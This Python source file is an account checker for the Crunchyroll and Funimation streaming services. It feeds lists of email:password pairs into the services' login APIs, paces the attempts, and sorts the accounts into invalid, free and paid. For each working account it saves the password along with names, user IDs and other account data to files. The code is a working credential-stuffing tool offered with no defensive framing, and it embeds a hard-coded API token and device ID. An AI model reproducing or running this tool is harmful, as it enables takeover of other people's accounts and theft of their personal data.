#!/usr/bin/python

import json
import requests
import sys
from termcolor import colored
import time
from datetime import date
import os


class CrunchyrollAPI:

    def __init__(self, config):

        # command
        self.log = True

        if config == 'null':

            # api
            self.version = '1.0'
            self.access_token = 'LNDJgOit5yaRIWN'
            self.device_type = 'com.crunchyroll.windows.desktop'
            self.device_id = 'AYS0igYFpmtb0h2RuJwvHPAhKK6RCYId'

            # backup
            self.invalid_accounts = True
            self.free_accounts = True
            self.other_accounts = True

            # data
            self.user_class = True
            self.user_id = True
            self.etp_guid = True
            self.first_name = True
            self.last_name = True
            self.username = True
            self.premium = True
            self.is_publisher = True
            self.access_type = True
            self.created = True
        else:
            try:
                with open(config, 'r') as f:
                    data = json.load(f)

                for i in data['command']:
                    self.log = i.get('log')

                for i in data['crunchyroll_api']:
                    self.version = i.get('version')
                    self.access_token = i.get('access_token')
                    self.device_type = i.get('device_type')
                    self.device_id = i.get('device_id')

                for i in data['backup']:
                    self.invalid_accounts = i.get('crunchyroll_invalid_account')
                    self.free_accounts = i.get('crunchyroll_free_account')
                    self.other_accounts = i.get('crunchyroll_other_account')

                for i in data['crunchyroll_data']:
                    self.user_class = i.get('class')
                    self.user_id = i.get('user_id')
                    self.etp_guid = i.get('etp_guid')
                    self.first_name = i.get('first_name')
                    self.last_name = i.get('last_name')
                    self.username = i.get('username')
                    self.premium = i.get('premium')
                    self.is_publisher = i.get('is_publisher')
                    self.access_type = i.get('access_type')
                    self.created = i.get('created')

            except:
                self.program_stop("ERROR: An error occurred while parsing the custom configuration file")

    def program_stop(self, message):
        if self.log:
            with open('logs.log', 'a') as log:
                t = time.localtime()
                log.write('\n' + '{} {}, Info checker: '.format(date.today(), time.strftime('%H:%M:%S', t)) + message)
        print(colored('\n' + message, 'red'))
        sys.exit(0)

    def get_session_id(self):
        r = requests.post('https://api.crunchyroll.com/start_session.0.json', data={'version': self.version, 'access_token': self.access_token, 'device_type': self.device_type, 'device_id': self.device_id})
        cookies = r.json()
        if cookies.get('error'):
            if cookies.get('code') == 'bad_auth_params':
                self.program_stop('ERROR: The API configuration is incorrect.')
            else:
                self.program_stop('ERROR: An unknown error has occurred. Code: {}'.format(cookies.get('code')))
        else:
            try:
                return cookies.get('data').get('session_id')
            except:
                self.program_stop('ERROR: An error occurred while recovering the "session_id".')

    def login(self, username, password):
        r = requests.post('https://api.crunchyroll.com/login.0.json', data={'account': username, 'password': password, 'session_id': self.get_session_id()})
        if r.text.__contains__('<!DOCTYPE html>'):
            self.program_stop('ERROR: Too many failed login attempts.')
        else:
            try:
                return r.json()
            except:
                self.program_stop('ERROR: Error while connecting to crunchyroll. Check if you are in a supported region or using a VPN.')

    def checker(self, account_list):
        if self.log:
            with open('logs.log', 'a') as log:
                t = time.localtime()
                log.write('\n' + '{} {}, Info checker: Analysis type: crunchyroll'.format(date.today(), time.strftime('%H:%M:%S', t)))
                log.write('\n' + '{} {}, Info checker: Number of accounts to analyze: {}'.format(date.today(), time.strftime('%H:%M:%S', t), len(account_list)))
                log.write('\n' + '{} {}, Info checker: Start of analysis'.format(date.today(), time.strftime('%H:%M:%S', t)))

        current_account = 0
        total_account = len(account_list)
        skipped_account_count = 0
        invalid_account_count = 0
        free_account_count = 0
        other_account_count = 0
        for account in account_list:
            current_account += 1
            username = account.split(':')[0].strip()
            password = account.split(':')[1].strip()

            already_analyzed = False
            if os.path.isfile('database/crunchyroll_account.txt'):
                with open('database/crunchyroll_account.txt', 'r') as database:
                    account_database = database.readlines()
                for line in account_database:
                    if line.__contains__(account):
                        already_analyzed = True

            if already_analyzed:
                skipped_account_count += 1
                result = '{"user":{' + '"email":"{}","password":"{}"'.format(username, password) + '},' + '"error":true,"code":"skipped_account","message":"Account already analyzed."}'
                print(colored(result, 'cyan'))
            else:
                time.sleep(3)
                json_login = self.login(username, password)
                if json_login.get('error'):
                    invalid_account_count += 1
                    code = json_login.get('code')
                    message = json_login.get('message')
                    if code == 'bad_request':
                        if message.__contains__('Incorrect login information'):
                            message = 'Incorrect login information.'
                    elif code == 'forbidden':
                        if message.__contains__('Your account has been temporarily locked'):
                            message = 'Your account has been temporarily locked.'
                    result = '{"user":{' + '"email":"{}","password":"{}"'.format(username, password) + '},' + '"error":true,"code":"{}","message":"{}"'.format(code, message) + '}'
                    print('\r' + colored(result, 'red'))
                    self.display_results(False, current_account, total_account)
                    if self.invalid_accounts:
                        if not os.path.exists('crunchyroll'):
                            os.makedirs('crunchyroll')
                        with open('crunchyroll/invalid_account.txt', 'a') as backup:
                            backup.write("\n" + result)
                    if not os.path.exists('database'):
                        os.makedirs('database')
                    with open('database/crunchyroll_account.txt', 'a') as backup:
                        backup.write("\n" + account)
                else:
                    access_type = json_login.get('data').get('user').get('access_type')
                    if access_type is None:
                        access_type = 'free'
                    result = ''
                    if self.user_class:
                        result = result + '"class":{},'.format(json_login.get('data').get('user').get('class'))
                    if self.user_id:
                        result = result + '"user_id":{},'.format(json_login.get('data').get('user').get('user_id'))
                    if self.etp_guid:
                        result = result + '"etp_guid":{},'.format(json_login.get('data').get('user').get('etp_guid'))
                    if self.first_name:
                        result = result + '"first_name":"{}",'.format(json_login.get('data').get('user').get('first_name'))
                    if self.last_name:
                        result = result + '"last_name":"{}",'.format(json_login.get('data').get('user').get('last_name'))
                    if self.username:
                        result = result + '"username":"{}",'.format(json_login.get('data').get('user').get('username'))
                    result = result + '"email":"{}","password":"{}",'.format(json_login.get('data').get('user').get('email'), password)
                    if self.premium:
                        result = result + '"premium":"{}",'.format(json_login.get('data').get('user').get('premium'))
                    if self.is_publisher:
                        result = result + '"is_publisher":"{}",'.format(json_login.get('data').get('user').get('is_publisher'))
                    if self.access_type:
                            result = result + '"access_type":"{}",'.format(access_type)
                    if self.created:
                        result = result + '"created":"{}",'.format(json_login.get('data').get('user').get('created'))
                    if result[-1] == ',':
                        result = result[0:len(result) - 1]
                    result = '{"user":{' + result + '},"error":false,"code":"ok"}'

                    if access_type == 'free':
                        free_account_count += 1
                        print('\r' + colored(result, 'yellow'))
                        if self.free_accounts:
                            if not os.path.exists('crunchyroll'):
                                os.makedirs('crunchyroll')
                            with open('crunchyroll/free_account.txt', 'a') as backup:
                                backup.write("\n" + result)
                    else:
                        other_account_count += 1
                        print('\r' + colored(result, 'green'))
                        if self.other_accounts:
                            if not os.path.exists('crunchyroll'):
                                os.makedirs('crunchyroll')
                            with open('crunchyroll/other_account.txt', 'a') as backup:
                                backup.write("\n" + result)

                    self.display_results(False, current_account, total_account)

                    if not os.path.exists('database'):
                        os.makedirs('database')
                    with open('database/crunchyroll_account.txt', 'a') as backup:
                        backup.write("\n" + account)

        self.display_results(True, None, None)
        result = 'Skipped: {}\nInvalid: {}\nFree: {}\nOther (Basic & Premium): {}'.format(skipped_account_count, invalid_account_count, free_account_count, other_account_count)
        print(result)
        print('\nThe program ended correctly.')
        if self.log:
            with open('logs.log', 'a') as log:
                message = 'Analysis result: Skipped: {}, Invalid: {}, Free: {}, Other (Premium & Fan): {}'.format(
                    skipped_account_count, invalid_account_count, free_account_count, other_account_count)
                t = time.localtime()
                log.write('\n' + '{} {}, Info checker: Account analysis completed'.format(date.today(),
                                                                                          time.strftime('%H:%M:%S', t)))
                log.write('\n' + '{} {}, Info checker: '.format(date.today(), time.strftime('%H:%M:%S', t)) + message)
        sys.exit(0)

    def display_results(self, finished, current, total):
        if finished:
            sys.stdout.write('\r' + '[info] Account analysis completed.')
            sys.stdout.flush()
            print("\n\n[info] Analysis result:")
        else:
            sys.stdout.write('\r' + '[info] Account tested: {}/{}'.format(current, total))
            sys.stdout.flush()


class FunimationAPI:

    def __init__(self, config):

        # command
        self.log = True

        if config == 'null':

            # api
            self.personal_csrftoken = False
            self.csrftoken = 'null'

            # backup
            self.invalid_accounts = True
            self.free_accounts = True
            self.other_accounts = True

            # data
            self.user_id = True
            self.first_name = True
            self.last_name = True
            self.displayName = True
            self.avatar = True
            self.access_type = True
            self.defaultLanguage = True
            self.created = True
        else:
            try:
                with open(config, 'r') as f:
                    data = json.load(f)

                for i in data['command']:
                    self.log = i.get('log')

                for i in data['funimation_api']:
                    self.personal_csrftoken = i.get('personal_csrftoken')
                    self.csrftoken = i.get('csrftoken')

                for i in data['backup']:
                    self.invalid_accounts = i.get('funimation_invalid_accounts')
                    self.free_accounts = i.get('funimation_free_accounts')
                    self.other_accounts = i.get('funimation_other_accounts')

                for i in data['funimation_data']:
                    self.user_id = i.get('user_id')
                    self.first_name = i.get('first_name')
                    self.last_name = i.get('last_name')
                    self.displayName = i.get('displayName')
                    self.avatar = i.get('avatar')
                    self.access_type = i.get('access_type')
                    self.defaultLanguage = i.get('defaultLanguage')
                    self.created = i.get('created')

            except:
                self.program_stop("ERROR: An error occurred while parsing the custom configuration file")

    def program_stop(self, message):
        if self.log:
            with open('logs.log', 'a') as log:
                t = time.localtime()
                log.write('\n' + '{} {}, Info checker: '.format(date.today(), time.strftime('%H:%M:%S', t)) + message)
        print(colored('\n' + message, 'red'))
        sys.exit(0)

    def get_csrftoken(self):
        r = requests.get('https://www.funimation.com/')
        cookies = r.cookies.get_dict()
        try:
            return cookies['csrftoken']
        except:
            self.program_stop('ERROR: An error occurred while recovering the "csrftoken". You can correct this error by using a personal "csrftoken" configurable using a custom configuration file.')

    def login(self, username, password):
        if not self.personal_csrftoken:
            self.csrftoken = self.get_csrftoken()
        r = requests.post('https://prod-api-funimationnow.dadcdigital.com/api/auth/login/', data={'username': username, 'password': password, "csrfmiddlewaretoken": self.csrftoken}, headers={"Referer": "https://www.funimation.com/log-in/"})
        try:
            return r.json()
        except:
            self.program_stop('ERROR: Error while connecting to funimation. Check if you are in a supported region or using a VPN.')

    def checker(self, account_list):
        if self.log:
            with open('logs.log', 'a') as log:
                t = time.localtime()
                log.write('\n' + '{} {}, Info checker: Analysis type: funimation'.format(date.today(), time.strftime('%H:%M:%S', t)))
                log.write('\n' + '{} {}, Info checker: Number of accounts to analyze: {}'.format(date.today(), time.strftime('%H:%M:%S', t), len(account_list)))
                log.write('\n' + '{} {}, Info checker: Start of analysis'.format(date.today(), time.strftime('%H:%M:%S', t)))

        current_account = 0
        total_account = len(account_list)
        skipped_account_count = 0
        invalid_account_count = 0
        free_account_count = 0
        other_account_count = 0
        for account in account_list:
            current_account += 1
            username = account.split(':')[0].strip()
            password = account.split(':')[1].strip()

            already_analyzed = False
            if os.path.isfile('database/funimation_account.txt'):
                with open('database/funimation_account.txt', 'r') as database:
                    account_database = database.readlines()
                for line in account_database:
                    if line.__contains__(account):
                        already_analyzed = True

            if already_analyzed:
                skipped_account_count += 1
                result = '{"user":{' + '"email":"{}","password":"{}"'.format(username, password) + '},' + '"error":true,"code":"skipped_account","message":"Account already analyzed."}'
                print(colored(result, 'cyan'))
            else:
                time.sleep(3)
                json_login = self.login(username, password)

                if json_login.__contains__("'success': False"):
                    message = json_login.get('error')
                    if message.__contains__('Failed Authentication'):
                        code = 'bad_account'
                        message = 'Failed Authentication.'
                    elif message.__contains__('Too many failed login attempts'):
                        code = 'bad_request'
                        message = 'Too many failed login attempts.'
                    else:
                        code = 'unknown'

                    if code == 'bad_request' or code == 'unknown':
                        self.program_stop('ERROR: {}'.format(message))
                    else:
                        invalid_account_count += 1
                        result = '{"user":{' + '"email":"{}","password":"{}"'.format(username, password) + '},' + '"error":true,"code":"{}","message":"{}"'.format(code, message) + '}'
                        print('\r' + colored(result, 'red'))
                        self.display_results(False, current_account, total_account)
                        if self.invalid_accounts:
                            if not os.path.exists('funimation'):
                                os.makedirs('funimation')
                            with open('funimation/invalid_account.txt', 'a') as backup:
                                backup.write("\n" + result)
                        if not os.path.exists('database'):
                            os.makedirs('database')
                        with open('database/funimation_account.txt', 'a') as backup:
                            backup.write("\n" + account)
                else:
                    result = ''
                    if self.user_id:
                        result = result + '"user_id":{},'.format(json_login['user'].get('id'))
                    if self.first_name:
                        result = result + '"first_name":"{}",'.format(json_login['user'].get('first_name'))
                    if self.last_name:
                        result = result + '"last_name":"{}",'.format(json_login['user'].get('last_name'))
                    if self.displayName:
                        result = result + '"displayName":"{}",'.format(json_login['user'].get('displayName'))
                    result = result + '"email":"{}","password":"{}",'.format(json_login['user'].get('email'), password)
                    if self.avatar:
                        result = result + '"avatar":"{}",'.format('https://www.funimation.com' + json_login['user'].get('avatar'))
                    if self.access_type:
                        result = result + '"access_type":"{}",'.format(json_login.get('rlildup_cookie').split('web:')[1])
                    if self.defaultLanguage:
                        result = result + '"defaultLanguage":"{}",'.format(json_login['user'].get('defaultLanguage'))
                    if self.created:
                        result = result + '"created":"{}",'.format(json_login['user'].get('date_joined'))
                    if result[-1] == ',':
                        result = result[0:len(result) - 1]
                    result = '{"user":{' + result + '},"error":false,"code":"ok"}'

                    if json_login.get('rlildup_cookie').split('web:')[1].__contains__('free'):
                        free_account_count +=1
                        print('\r' + colored(result, 'yellow'))
                        if self.free_accounts:
                            if not os.path.exists('funimation'):
                                os.makedirs('funimation')
                            with open('funimation/free_account.txt', 'a') as backup:
                                backup.write("\n" + result)
                    else:
                        other_account_count += 1
                        print('\r' + colored(result, 'green'))
                        if self.other_accounts:
                            if not os.path.exists('funimation'):
                                os.makedirs('funimation')
                            with open('funimation/other_account.txt', 'a') as backup:
                                backup.write("\n" + result)

                    self.display_results(False, current_account, total_account)

                    if not os.path.exists('database'):
                        os.makedirs('database')
                    with open('database/funimation_account.txt', 'a') as backup:
                        backup.write("\n" + account)

        self.display_results(True, None, None)
        result = 'Skipped: {}\nInvalid: {}\nFree: {}\nOther (Basic & Premium): {}'.format(skipped_account_count, invalid_account_count, free_account_count, other_account_count)
        print(result)
        print('\nThe program ended correctly.')
        if self.log:
            with open('logs.log', 'a') as log:
                message = 'Analysis result: Skipped: {}, Invalid: {}, Free: {}, Other (Basic & Premium): {}'.format(skipped_account_count, invalid_account_count, free_account_count, other_account_count)
                t = time.localtime()
                log.write('\n' + '{} {}, Info checker: Account analysis completed'.format(date.today(), time.strftime('%H:%M:%S', t)))
                log.write('\n' + '{} {}, Info checker: '.format(date.today(), time.strftime('%H:%M:%S', t)) + message)
        sys.exit(0)

    def display_results(self, finished, current, total):
        if finished:
            sys.stdout.write('\r' + '[info] Account analysis completed.')
            sys.stdout.flush()
            print("\n\n[info] Analysis result:")
        else:
            sys.stdout.write('\r' + '[info] Account tested: {}/{}'.format(current, total))
            sys.stdout.flush()
